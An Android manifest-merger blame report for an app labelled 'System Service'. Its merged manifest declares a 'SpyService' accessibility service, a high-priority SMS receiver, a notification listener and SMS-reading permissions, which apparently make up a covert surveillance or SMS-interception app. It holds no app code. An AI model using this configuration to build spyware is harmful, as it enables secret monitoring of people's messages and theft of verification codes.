app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.example.service"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="34" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src\main\AndroidManifest.xml:6:5-67
11-->src\main\AndroidManifest.xml:6:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src\main\AndroidManifest.xml:7:5-79
12-->src\main\AndroidManifest.xml:7:22-76
13    <uses-permission android:name="android.permission.RECEIVE_SMS" />
13-->src\main\AndroidManifest.xml:8:5-70
13-->src\main\AndroidManifest.xml:8:22-67
14    <uses-permission android:name="android.permission.READ_SMS" />
14-->src\main\AndroidManifest.xml:9:5-67
14-->src\main\AndroidManifest.xml:9:22-64
15    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
15-->src\main\AndroidManifest.xml:10:5-93
15-->src\main\AndroidManifest.xml:10:22-90
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src\main\AndroidManifest.xml:11:5-77
16-->src\main\AndroidManifest.xml:11:22-74
17
18    <permission
18-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
19        android:name="com.example.service.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
19-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
20        android:protectionLevel="signature" />
20-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
21
22    <uses-permission android:name="com.example.service.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
22-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
22-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
23
24    <application
24-->src\main\AndroidManifest.xml:13:5-62:19
25        android:allowBackup="true"
25-->src\main\AndroidManifest.xml:14:9-35
26        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
26-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
27        android:debuggable="true"
28        android:extractNativeLibs="false"
29        android:icon="@drawable/ic_launcher"
29-->src\main\AndroidManifest.xml:15:9-45
30        android:label="System Service"
30-->src\main\AndroidManifest.xml:16:9-39
31        android:theme="@style/Theme.AppCompat.Light"
31-->src\main\AndroidManifest.xml:17:9-53
32        android:usesCleartextTraffic="true" >
32-->src\main\AndroidManifest.xml:18:9-44
33        <activity
33-->src\main\AndroidManifest.xml:21:9-28:20
34            android:name="com.example.service.MainActivity"
34-->src\main\AndroidManifest.xml:22:13-41
35            android:exported="true" >
35-->src\main\AndroidManifest.xml:23:13-36
36            <intent-filter>
36-->src\main\AndroidManifest.xml:24:13-27:29
37                <action android:name="android.intent.action.MAIN" />
37-->src\main\AndroidManifest.xml:25:17-69
37-->src\main\AndroidManifest.xml:25:25-66
38
39                <category android:name="android.intent.category.LAUNCHER" />
39-->src\main\AndroidManifest.xml:26:17-77
39-->src\main\AndroidManifest.xml:26:27-74
40            </intent-filter>
41        </activity>
42
43        <service
43-->src\main\AndroidManifest.xml:30:9-41:19
44            android:name="com.example.service.SpyService"
44-->src\main\AndroidManifest.xml:31:13-39
45            android:enabled="true"
45-->src\main\AndroidManifest.xml:32:13-35
46            android:exported="true"
46-->src\main\AndroidManifest.xml:33:13-36
47            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
47-->src\main\AndroidManifest.xml:34:13-79
48            <intent-filter>
48-->src\main\AndroidManifest.xml:35:13-37:29
49                <action android:name="android.accessibilityservice.AccessibilityService" />
49-->src\main\AndroidManifest.xml:36:17-92
49-->src\main\AndroidManifest.xml:36:25-89
50            </intent-filter>
51
52            <meta-data
52-->src\main\AndroidManifest.xml:38:13-40:58
53                android:name="android.accessibilityservice"
53-->src\main\AndroidManifest.xml:39:17-60
54                android:resource="@xml/service_config" />
54-->src\main\AndroidManifest.xml:40:17-55
55        </service>
56
57        <receiver
57-->src\main\AndroidManifest.xml:43:9-51:20
58            android:name="com.example.service.SMSReceiver"
58-->src\main\AndroidManifest.xml:44:13-40
59            android:enabled="true"
59-->src\main\AndroidManifest.xml:45:13-35
60            android:exported="true" >
60-->src\main\AndroidManifest.xml:46:13-36
61            <intent-filter android:priority="999" >
61-->src\main\AndroidManifest.xml:47:13-50:29
61-->src\main\AndroidManifest.xml:47:28-50
62                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
62-->src\main\AndroidManifest.xml:48:17-82
62-->src\main\AndroidManifest.xml:48:25-79
63                <action android:name="android.provider.Telephony.SMS_DELIVER" />
63-->src\main\AndroidManifest.xml:49:17-81
63-->src\main\AndroidManifest.xml:49:25-78
64            </intent-filter>
65        </receiver>
66
67        <service
67-->src\main\AndroidManifest.xml:53:9-60:19
68            android:name="com.example.service.NotificationListener"
68-->src\main\AndroidManifest.xml:54:13-49
69            android:exported="true"
69-->src\main\AndroidManifest.xml:56:13-36
70            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
70-->src\main\AndroidManifest.xml:55:13-87
71            <intent-filter>
71-->src\main\AndroidManifest.xml:57:13-59:29
72                <action android:name="android.service.notification.NotificationListenerService" />
72-->src\main\AndroidManifest.xml:58:17-99
72-->src\main\AndroidManifest.xml:58:25-96
73            </intent-filter>
74        </service>
75
76        <provider
76-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
77            android:name="androidx.startup.InitializationProvider"
77-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
78            android:authorities="com.example.service.androidx-startup"
78-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
79            android:exported="false" >
79-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
80            <meta-data
80-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
81                android:name="androidx.emoji2.text.EmojiCompatInitializer"
81-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
82                android:value="androidx.startup" />
82-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
83            <meta-data
83-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:31:13-33:52
84                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
84-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:32:17-78
85                android:value="androidx.startup" />
85-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:33:17-49
86        </provider>
87    </application>
88
89</manifest>